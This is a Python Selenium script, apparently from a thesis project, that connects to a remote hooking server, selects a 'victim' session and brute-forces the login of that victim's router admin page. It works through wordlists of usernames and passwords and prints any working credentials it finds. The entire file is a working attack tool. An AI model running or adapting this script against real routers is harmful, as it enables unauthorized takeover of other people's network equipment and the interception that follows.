#!/usr/bin/python3
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import TimeoutException
import json
import time
import itertools
import sys

def passwordAttack(password):

	password_element = driver.find_element_by_xpath(password)
	currentUrl = driver.current_url

	with open('python/resources/passwords.txt') as passwords:
		for password in passwords:
			password_element.click()
			password_element.clear()
			password_element.send_keys(password.strip())
			password_element.send_keys(Keys.ENTER)
			time.sleep(5)
			if driver.current_url != currentUrl:
				return (password.strip()+":null")

	with open('python/resources/users.txt') as users:
		for password in users:
			password_element.click()
			password_element.clear()
			password_element.send_keys(password.strip())
			password_element.send_keys(Keys.ENTER)
			time.sleep(5)
			if driver.current_url != currentUrl:
				return (password.strip()+":null")
	return ("null:null")

def userAndPasswordAttack(username, password):
	username_element = driver.find_element_by_xpath(username)
	password_element = driver.find_element_by_xpath(password)
	currentUrl = driver.current_url

	with open('python/resources/users.txt') as users:
		with open('python/resources/passwords.txt') as passwords:
			for username, password in itertools.product(users, passwords):
				username_element.click()
				username_element.clear()
				username_element.send_keys(username.strip())
				password_element.click()
				password_element.clear()
				password_element.send_keys(password.strip())
				password_element.send_keys(Keys.ENTER)
				time.sleep(5)
				if driver.current_url != currentUrl:
					return (username.strip()+":"+password.strip())
	return ("null:null")

result = ""
options = Options()
options.add_argument("--headless")
options.headless = True

infoArray = []
for index in range(1,len(sys.argv)):
    infoArray.append(sys.argv[index]) 
    
# Opening JSON file
f = open('html/resources/router-config.json',)

# returns JSON object as
# a dictionary
data = json.load(f)

# Closing file
f.close()

server_id = infoArray[0]
session_id = infoArray[1]
router_brand = infoArray[2]
router_model = infoArray[3]
router_id = None

for i in range(len(data['routers'])):
	if router_brand == data['routers'][i]['brand'] and router_model == data['routers'][i]['model']:
		router_id = i
		break

# Navigate to page
driver = webdriver.Firefox(options=options, executable_path=r'python/drivers/geckodriver')
driver.get('http://soohooked.thesisdns.xyz:3129/')

delay = 60 # seconds

try:
	input_element = WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.ID, "password")))
	input_element.send_keys(server_id)
	input_element.submit()
	
	time.sleep(4)
	
	error = driver.find_elements_by_tag_name('pre')
	text_list = [i.text for i in error]
	
	for i in range(len(text_list)):
		if text_list[i] == 'Authentication failed.':
			print('error', end = '')
			driver.quit()
			sys.exit()

	items = driver.find_elements_by_tag_name('a')
	
	text_list = [i.text for i in items]
	items = [i.get_attribute("href") for i in items]
	victim_err = True
	
	for i in range(len(items)):
		if session_id in items[i]:
			victim_err = False
			target_link = items[i]
	if victim_err:
		print('error', end = '')
		driver.quit()
		sys.exit()
	
	driver.get(target_link)
	
	username = data['routers'][router_id]['username']
	password = data['routers'][router_id]['password']

	myElem = WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH, password)))
	
	time.sleep(4)

	if username == "null":
		result = passwordAttack(password)
	else:
		result = userAndPasswordAttack(username, password)
		
	print(result, end = '')
			
	time.sleep(3)

	element = driver.find_element_by_id("h_menu_list")
	element.click()
		
	time.sleep(1)

	element = driver.find_element_by_id("navbar_logout")
	element.click()

	time.sleep(1)

	element = driver.find_element_by_xpath('//span[text()="OK"]/ancestor::button')
	element.click()
			
	time.sleep(1)	    		
	driver.quit() 
	sys.exit()

except TimeoutException:
    print ("error", end = '')
    driver.quit()
    sys.exit()
    					

